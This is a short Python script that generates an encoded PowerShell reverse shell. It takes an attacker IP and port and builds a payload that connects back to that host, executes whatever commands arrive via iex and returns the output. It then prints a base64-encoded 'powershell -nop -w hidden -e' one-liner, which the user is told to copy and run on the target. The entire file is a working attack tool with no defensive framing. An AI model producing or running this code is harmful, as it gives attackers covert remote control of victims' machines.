import sys
import base64

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

attacker_ip = sys.argv[1]
attacker_port = sys.argv[2]

payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{attacker_ip}",{attacker_port});
$stream = $client.GetStream();
[byte[]]$bytes = (0..65535 | ForEach-Object {{0}});
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close();
'''

encoded_payload = base64.b64encode(payload.encode('utf-16le')).decode()
powershell_cmd = f"powershell -nop -w hidden -e {encoded_payload}"
print("\n🔹 Copy and Run this Command on the Target:")
print(powershell_cmd)
